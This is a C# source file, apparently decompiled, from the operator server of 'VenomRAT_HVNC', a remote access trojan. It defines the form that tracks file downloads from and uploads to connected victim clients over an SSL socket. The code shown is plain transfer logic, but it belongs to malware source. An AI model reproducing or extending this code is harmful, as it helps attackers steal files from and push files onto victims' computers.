using System;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;
using Server;
using VenomRAT_HVNC.Server.Connection;
using VenomRAT_HVNC.Server.Helper;

namespace VenomRAT_HVNC.Server.Forms
{
    // Token: 0x02000088 RID: 136
    public partial class FormDownloadFile : Form
    {
        // Token: 0x170000D9 RID: 217
        // (get) Token: 0x06000503 RID: 1283 RVA: 0x0003BDF9 File Offset: 0x0003BDF9
        // (set) Token: 0x06000504 RID: 1284 RVA: 0x0003BE01 File Offset: 0x0003BE01
        public Form1 F { get; set; }

        // Token: 0x170000DA RID: 218
        // (get) Token: 0x06000505 RID: 1285 RVA: 0x0003BE0A File Offset: 0x0003BE0A
        // (set) Token: 0x06000506 RID: 1286 RVA: 0x0003BE12 File Offset: 0x0003BE12
        internal Clients Client { get; set; }

        // Token: 0x06000507 RID: 1287 RVA: 0x0003BE1B File Offset: 0x0003BE1B
        public FormDownloadFile()
        {
            this.InitializeComponent();
        }

        // Token: 0x06000508 RID: 1288 RVA: 0x0003BE2C File Offset: 0x0003BE2C
        private void timer1_Tick(object sender, EventArgs e)
        {
            if (this.FileSize >= 2147483647L)
            {
                this.timer1.Stop();
                MessageBox.Show("Don't support files larger than 2GB.");
                base.Dispose();
                return;
            }
            if (!this.IsUpload)
            {
                this.labelsize.Text = Methods.BytesToString(this.FileSize) + " \\ " + Methods.BytesToString(this.Client.BytesRecevied);
                if (this.Client.BytesRecevied >= this.FileSize)
                {
                    this.labelsize.Text = "Downloaded";
                    this.labelsize.ForeColor = Color.Green;
                    this.timer1.Stop();
                    return;
                }
            }
            else
            {
                this.labelsize.Text = Methods.BytesToString(this.FileSize) + " \\ " + Methods.BytesToString(this.BytesSent);
                if (this.BytesSent >= this.FileSize)
                {
                    this.labelsize.Text = "Uploaded";
                    this.labelsize.ForeColor = Color.Green;
                    this.timer1.Stop();
                }
            }
        }

        // Token: 0x06000509 RID: 1289 RVA: 0x0003BF44 File Offset: 0x0003BF44
        private void SocketDownload_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                Clients client = this.Client;
                if (client != null)
                {
                    client.Disconnected();
                }
                Timer timer = this.timer1;
                if (timer != null)
                {
                    timer.Dispose();
                }
            }
            catch
            {
            }
        }

        // Token: 0x0600050A RID: 1290 RVA: 0x0003BF88 File Offset: 0x0003BF88
        public void Send(object obj)
        {
            object sendSync = this.Client.SendSync;
            lock (sendSync)
            {
                try
                {
                    this.IsUpload = true;
                    byte[] array = (byte[])obj;
                    byte[] bytes = BitConverter.GetBytes(array.Length);
                    this.Client.TcpClient.Poll(-1, SelectMode.SelectWrite);
                    this.Client.SslClient.Write(bytes, 0, bytes.Length);
                    using (MemoryStream memoryStream = new MemoryStream(array))
                    {
                        memoryStream.Position = 0L;
                        byte[] array2 = new byte[50000];
                        int num;
                        while ((num = memoryStream.Read(array2, 0, array2.Length)) > 0)
                        {
                            this.Client.TcpClient.Poll(-1, SelectMode.SelectWrite);
                            this.Client.SslClient.Write(array2, 0, num);
                            this.BytesSent += (long)num;
                        }
                    }
                    Program.form1.BeginInvoke(new MethodInvoker(delegate ()
                    {
                        base.Close();
                    }));
                }
                catch
                {
                    Clients client = this.Client;
                    if (client != null)
                    {
                        client.Disconnected();
                    }
                    Program.form1.BeginInvoke(new MethodInvoker(delegate ()
                    {
                        this.labelsize.Text = "Error";
                        this.labelsize.ForeColor = Color.Red;
                    }));
                }
            }
        }

        // Token: 0x04000499 RID: 1177
        public long FileSize;

        // Token: 0x0400049A RID: 1178
        private long BytesSent;

        // Token: 0x0400049B RID: 1179
        public string FullFileName;

        // Token: 0x0400049C RID: 1180
        public string ClientFullFileName;

        // Token: 0x0400049D RID: 1181
        private bool IsUpload;

        // Token: 0x0400049E RID: 1182
        public string DirPath;
    }
}